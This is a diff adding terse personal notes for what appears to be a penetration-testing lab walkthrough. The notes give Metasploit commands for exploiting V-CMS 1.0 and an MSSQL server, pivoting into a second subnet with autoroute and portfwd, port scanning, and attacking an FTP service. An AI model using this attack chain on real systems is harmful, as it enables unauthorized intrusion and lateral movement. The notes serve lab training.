@@ -29,7 +29,34 @@
 - use auxiliary/admin/mssql/mssql_enum     [enumeration]
 - use exploit/windows/mssql/mssql_payload  [exploit]
 - Gives us a meterpreter session
-- 
+
+### The Black Box Walkthrough's : Remastered 1
+#### Machine 1
+- Enumeration reveals it's using V-CMS 1.0
+- Search Metasploit, there will be an open exploit
+- use exploit/linux/http/vcms_upload
+- As mentioned it the question, the vcms server is connected to some other webserver on some other network
+
+#### Machine 2
+- cat /etc/hosts will reveal the other web server info/ or ifconfig will also gives info about the other network
+- But, still we wont be able to ping the other network subnet
+- run autoroute -s 192.69.228.0 -n 255.255.255.0 -> this adds route automatically to the meterprrter session
+- route add 192.69.228.0 255.255.255.0 1  -> you can also use this where "1" is the meterpreter session id
+- use auxiliary/scanner/portscan/tcp
+- set PORTS 80, 8080, 445, 21, 22
+- set RHOSTS 192.69.228.3-10
+- exploit
+- This will do a portscan on the remote network and reveals the open ports
+- Then we need to portforward our local port to the remote port do a nmap scan
+- portfwd add -l 1234 -p 21 -r 192.69.228.3  -> l [local port] p [parayvalla port] r [remote Ip]
+- nmap -sS -sV -p 1234 localhost
+- This reveals a ftp service and version, using metasploit, we can find a inbuilt exploit, then boo tada
+
+
+
+
+
+
 
 
 
